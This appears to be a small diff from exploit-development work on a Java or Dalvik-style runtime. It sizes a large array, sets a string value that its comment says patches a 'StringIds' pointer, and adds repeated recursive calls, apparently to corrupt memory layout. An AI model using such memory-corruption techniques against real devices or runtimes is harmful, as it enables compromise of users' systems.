@@ -8,9 +8,11 @@ public class Min {
     public static void foo() {
         int a[] = new int[(0xff-1-0x20)*0x1000/8-5];
         String x;
-        x = "-13";  // String to be the offset to StringIds
-        x = "-14";  // String to be the offset to StringIds
-        x = "-15";  // String to be the offset to StringIds
-        x = "-16";  // String to be the offset to StringIds
+        x = "-167";  // patch the 2nd bytes to StringIds pointer, offset to StringIds, (0xb0-0x19)
+        foo();
+        foo();
+        foo();
+        foo();
+        foo();
     }
 }
